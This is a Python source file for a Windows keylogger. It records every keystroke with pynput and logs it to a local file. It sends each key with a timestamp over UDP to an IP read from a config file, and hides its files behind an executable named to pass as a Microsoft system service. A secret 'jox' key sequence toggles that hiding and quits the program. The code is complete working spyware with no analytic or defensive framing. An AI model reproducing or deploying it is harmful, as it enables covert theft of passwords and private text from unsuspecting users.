from pynput.keyboard import Listener
import socket
import datetime
import os
from subprocess import call
import logging

CREATE_NO_WINDOW = 0x08000000
jox = ''
ip = ''
flag =False
if os.path.exists("conf.jox")==False:
    conf = open('conf.jox', 'w+')
    conf.close()
if os.path.exists("logs.jox")==False:
    logs = open('logs.jox', 'w+')
    logs.close()

logging.basicConfig(filename=("logs.jox"), format="%(asctime)s:%(message)s",level=logging.DEBUG)

def connect(ip,key):
    ip_port = (ip, 9999)
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
    now_time = datetime.datetime.now()
    try:
        sk.sendto(bytes(now_time.strftime('%Y-%m-%d %H:%M:%S') + "  " + key, encoding='utf8'), ip_port)
        sk.close()
    except Exception as e:
        print(e)




def press(key):
    key = str(key)
    if key[0:4] == 'Key.':
        key = key.split(".")[1]
    else:
        key = key.split("\'")[1]
    global jox
    global ip
    global flag

    if  jox == 'jox':
        if key == 's':
            call("attrib +s +a -h +r logs.jox",creationflags=CREATE_NO_WINDOW)
            call("attrib +s +a -h +r conf.jox",creationflags=CREATE_NO_WINDOW)
            call("attrib +s +a -h +r \"Microsoft Network Realtime Inspection Services.exe\"",creationflags=CREATE_NO_WINDOW)
        elif key == 'h':
            call("attrib +s +a +h +r logs.jox",creationflags=CREATE_NO_WINDOW)
            call("attrib +s +a +h +r conf.jox",creationflags=CREATE_NO_WINDOW)
            call("attrib +s +a +h +r \"Microsoft Network Realtime Inspection Services.exe\"",creationflags=CREATE_NO_WINDOW)
        elif key == 'q':
            exit("")
        else:
            jox = ''



    if key == 'j':
        jox += 'j'
    if key == 'o':
        jox +='o'
    if key == 'x':
        jox += 'x'
    if ((key !='j' and jox!='') and (key!='o' and jox!='j') and (key!='x' and jox!='jo')):
        jox = ''
    logging.info(key)
    if flag == False:
        f = open('conf.jox','r')
        line = f.readlines()
        for i in line:
            iplist = i.split("=")
            if iplist[0]=='ip':
                ip = iplist[1]
                flag = True
    else:
        connect(ip,key)




with Listener(on_press=press) as listener:
    try:
        listener.join()
    except Exception as e:
        print(e)
